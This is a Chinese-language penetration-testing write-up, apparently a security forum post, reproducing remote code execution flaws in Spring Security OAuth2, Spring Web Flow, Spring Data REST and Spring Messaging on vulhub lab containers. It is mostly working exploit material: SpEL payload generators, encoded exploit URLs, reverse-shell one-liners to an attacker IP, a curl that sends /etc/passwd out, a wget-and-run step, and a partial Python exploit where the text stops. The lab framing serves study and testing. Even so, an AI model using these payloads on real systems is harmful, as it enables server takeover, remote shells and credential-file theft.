Spring
======

前言
--

Spring是 Java EE编程领域的一个轻量级开源框架，该框架是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。

框架的主要**优势**之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为J2EE应用程序开发提供集成的框架

简单组件介绍
------

Spring发展至今，整个体系不断壮大，这里只简单介绍一些组件。  
首先是 Spring Websocket，Spring内置简单消息代理。这个代理处理来自客户端的订阅请求，将它们存储在内存中，并将消息广播到具有匹配目标的连接客户端。

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。

Spring Data Commons是 Spring Data下所有子项目共享的基础框架，Spring Data家族中的所有实现都是基于 Spring Data Commons。

**简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现，并符合HAL的规范**

Spring Web Flow是Spring MVC的扩展，它支持开发基于流程的应用程序，可以将流程的定乂和实现流程行为的类和视图分离开来

Spring渗透
--------

### Spring Security OAuth2远程命令执行突破(CVE-2016-4977)

#### 影响版本

```php
2.0.0-2.0.9
1.0.0-1.0.5
```

#### 漏洞搭建

还是使用P牛的靶场

```php
cd vulhub-master/spring/CVE-2016-4977
sudo docker-compose up -d
```

![image-20210521080906589](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e97fbac27da7a2fb1e81a8bd66eab0d9943d7e5f.png)

#### 漏洞复现

访问

```php
http://192.168.175.209:8080/
```

![image-20210521081105117](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c577ce6bc65adf460e97da02d469d7ce561abcd.png)

#### 漏洞验证

访问该url 会进行登录验证

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

![image-20210521081127941](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9c2347352912baa4d8bfa098f978cc3ef8ab1702.png)

默认账号密码是

```php
admin
admin
```

登录成功

![image-20210521081210298](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8e05b710d6d0acacb7cf5d8bb2ec048040606f7e.png)

#### Poc

我们看一下vulhub提供的Poc

```php
#!/usr/bin/env python
message = input('Enter message to encode:')
poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
 poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ')}'
print(poc)
```

这里是java的命令执行

![image-20210521082836766](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3857552751215e3627cc72bd5396d552d52cad0f.png)

执行一下poc.py

![image-20210521082811068](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f542bf6a34fa0cedfb734a59a38ed715e1acb6f.png)

#### 测试RCE

我们执行的命令是`whoami` 把回显放到表达式中

执行一下

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

执行成功

![image-20210521083111824](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-852e375ed977c1cf19379d6381121c91170e9374.png)

这里注意：只是返回了进程，但实际上是命令执行

这是**无回显RCE**

#### 测试XXE

先在bash下做测试

```php
curl 192.168.175.130:8888 -d "$(cat /etc/passwd)" 

nc -lvp 8888
```

![image-20210521084442961](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b74fbb563585316a6d4b5650dc0dac8f11f2e037.png)

![image-20210521084453479](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cd9e9dd621ad8de7b370a5db73bcedb02dfa9011.png)

那么就将该命令放入poc中生成最终的payload

![image-20210521084757291](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee303af3724c71f13c9b181c0e1c26f7b5d078aa.png)

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(36)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(32)))}
&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

![image-20210521084905830](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aa37a77f93d11d34ff41609078d316da30e1aeed.png)

执行成功

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6c5de6d12396b51d9a0e0b87101658b6fa6498f2.png)

但是这边nc反弹之后 后面没有东西了

![image-20210521085003681](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d329f1753060978d53754e9d3b8636972ec5353f.png)

#### 踩坑记录：

![image-20210521085950628](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-203c874049a39462e338390e0850eff8954cb18a.png)

```php
curl 192.168.175.130:8888 -d "$(cat /etc/passwd)" 
bash -c {echo,Y3VybCAxOTIuMTY4LjE3NS4xMzA6ODg4OCAtZCAiJChjYXQgL2V0Yy9wYXNzd2QpIiA=}|{base64,-d}|{bash,-i}
```

![image-20210521090037876](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe233209391d5cc30d76732b4b9e4bac82e16b5f.png)

![image-20210521090154377](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-da12d986b1ec22a41aad080aadc4d0ded91376d6.png)

最终的payload

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}
&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

执行之后 成功回显

![image-20210521090244473](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-38427e6b71e428eb593c94a28c5fbca5f7cab66c.png)

![image-20210521090223786](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f68348372ed81971f18eac3525f76a814443b252.png)

#### 反弹shell

那么这边我直接反弹shell了

上java编码的网站

```php
http://www.jackson-t.ca/runtime-exec-payloads.html
```

![image-20210521085321594](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-26aec737e9660c9a0458d95ba39c13e2bc06200f.png)

```php
bash -i >&amp; /dev/tcp/192.168.175.130/8888 0>&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```

将该命令放入Poc中

![image-20210521085526917](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1cd3f788c05c8fb104bbcf96480f9ba206fbbd22.png)

最终的payload：

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

执行一下

![image-20210521085717667](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b510d17c99efa9a1b398c899d530bfc76bcc8045.png)

成功拿到shell

![image-20210521085734350](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c81eef1b4b1019f951837075332d56b7c5c379b2.png)

#### 优化Poc

```php
#!/usr/bin/env python
import base64
message = input('Enter message to encode:')
message = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % bytes.decode(base64.b64encode(message.encode('utf-8')))
print(message)
poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
 poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ')}'
print(poc)
```

![image-20210521090415010](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a6e7079d568b060ff7d4bf96474d2fca3d4580e3.png)

![image-20210521090655856](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20f96d2ce9070b7d94244d0c68497ec307530aa5.png)

最终的payload

```php
http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test
```

执行成功后

![image-20210521090725948](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-525310ae55bfe57cf299d7b4cf923366097106ff.png)

成功回显

![image-20210521090738364](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-effa9fb4b2442b56719af592abef9e4de6d5610d.png)

### Spring Web Flow框架远程代码执行(CVE-2017-4971)

#### 影响版本

```php
Spring WebFlow 2.4.0 - 2.4.4
```

#### 触发漏洞需要的两个条件

```php
1.MvcViewFactoryCreator对象的 useSpringBeanBinding参数需要设置为 false（默认值）
2.flow view对象中设置 BinderConfiguration对象为空
```

#### 漏洞搭建

关闭之前的docker镜像

![image-20210521094032174](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c7f129c5d4bf642bf686d03098a7d0972f412bc4.png)

还是使用vulhub进行搭建

```php
cd vulhub-master/spring/CVE-2017-4971
sudo docker-compose up -d
```

![image-20210521094341522](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f16fc4eb91835696f232b5d39ab78f278f7ec994.png)

#### 漏洞复现

#### 漏洞验证

访问

```php
http://192.168.175.209:8080/login
```

![image-20210521094412376](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e70b8bf78cf6ea9df4d410ccc5cda9e3279154d0.png)

用任意账号/密码登录系统

![image-20210521094430216](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-864ffb082fe6e89fe855b86fb6124c7eefc9129b.png)

![image-20210521094611129](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-21162b89ad88f3c137a3d9f3440e2c1450919c3d.png)

然后访问id=1的酒店地址

![image-20210521094725512](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a4f4a5d374f693f083fce82807ce3385be5cfaad.png)

![image-20210521095055636](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-60bbc76152823e4c918536b928f80738a9d464b4.png)

然后进行抓包

![image-20210521095217172](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-14cf01220102e646e71059f0ad67ba372370ea46.png)

![image-20210521095326142](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f8e60972c7ae919b12eaa4f27192529375ea4db5.png)

#### Poc(反弹shell)

```php
_(new java.lang.ProcessBuilder("bash","-c","bash -i >&amp; /dev/tcp/192.168.175.130/8888 0>&amp;1")).start()=vulhub
URL编码后：
_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.175.130/8888 0>%261")).start()=vulhub
```

进行执行

![image-20210521101939418](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c34cf55c700a847caf9ae69316d8fe2ff765cdc3.png)

成功拿到反弹shell

![image-20210521101957457](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-34d2bde7a054f91404f41fd37947c6c192bcb4c8.png)

#### EXP拓展

执行命令

```php
&amp;_T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
或者
&amp;_(new+java.lang.ProcessBuilder("touch /tmp/success2")).start()=test
```

![image-20210521102426141](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-13632cc508eeadd9702fdcdda91f222e5281d7b6.png)

![image-20210521102447095](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0a0f833d8952859a79c8c16140336bf11f24e85d.png)

远程下载脚本 并执行

```php
&amp;_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.175.130:8888/1")

&amp;_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/1")
```

### Spring data Rest远程命令执行命令(CVE-2017-8046)

### 影响版本

```php
Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
Spring Boot version < 2.0.0M4
Spring Data release trains < Kay-RC3
```

#### 漏洞搭建

关闭之前的docker镜像

![image-20210521102823896](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-31ea31e4ade043a418a1e652147fe1048c5cf3a6.png)

```php
cd vulhub-master/spring/CVE-2017-8046
sudo docker-compose up -d
```

![image-20210521103116167](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dd65c39c9548f62493132e51d243c62214a7d4b3.png)

#### 漏洞复现

访问

![image-20210521103134848](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2eb4f6173c387c49b82a25555522eaca2c19dfac.png)

#### 漏洞验证

访问

```php
http://192.168.175.209:8080/customers/1
```

![image-20210521103330023](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-11bfa47b9087132119c4bb42cca34dab1b172ede.png)

进行抓包

![image-20210521103417353](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe2f6f682018662c56d2d2562dd3823958b119bf.png)

修改成PATCH请求

#### Poc

```php
PATCH /customers/1 HTTP/1.1
Host: 192.168.175.209:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 210
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```

进行执行

![image-20210521104331898](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d1e0fedaf59c0cd346166ca36f5f4b9a670afc78.png)

然后我们去docker底层看一下

可以看到是成功创建的

![image-20210521123013062](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-afc01b74d0b56f9ead458818e60fe5e0cd75ed13.png)

#### Poc原理+反弹shell

```php
",".join(map(str, (map(ord,"touch /tmp/a001"))))
'116,111,117,99,104,32,47,116,109,112,47,97,48,48,49'
```

![image-20210521123140977](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9ecb5fc1d11c0324b21a73bfbfea9b33715c21d1.png)

反弹shell

```php
bash -i >&amp; /dev/tcp/192.168.175.130/8888 0>&amp;1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```

![image-20210521124108717](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-049124faa9b5800ff32111d621198cfba8483dc6.png)

```php
",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"))))
```

![image-20210521124214334](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fede11d4cd86d2cd8c1bbad650a6d1890a34b0db.png)

```php
98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,78,83,52,120,77,122,65,118,79,68,103,52,79,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125
```

进行执行

![image-20210521124336095](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7978b91787aa965945f1120da8308b2d1f814300.png)

成功反弹shell

![image-20210521124346504](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-871262bd94c0b7cb6e3e40bad8ee6014a456e626.png)

### Spring Messaging远程命令执行突破(CVE2018-1270)

#### 影响版本

```php
Spring Framework 5.0 to 5.0.4.
Spring Framework 4.3 to 4.3.14
已经不支持的旧版本依然受到影响
```

#### 漏洞搭建

```php
cd 
sudo docker-compose up -d
```

![image-20210522092202285](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0bf6d86e108c659407c309fc5485756d77b0c505.png)

#### 漏洞复现

![image-20210522092220807](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7248ab22fd2f814fbffce3f3c475193f9a0e5d01.png)

访问

```php
http://192.168.175.209:8080/gs-guide-websocket
```

![image-20210522092400364](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39cba45326c123da5ac556fc524b560de43ed87d.png)

#### Poc

```php
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))

class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
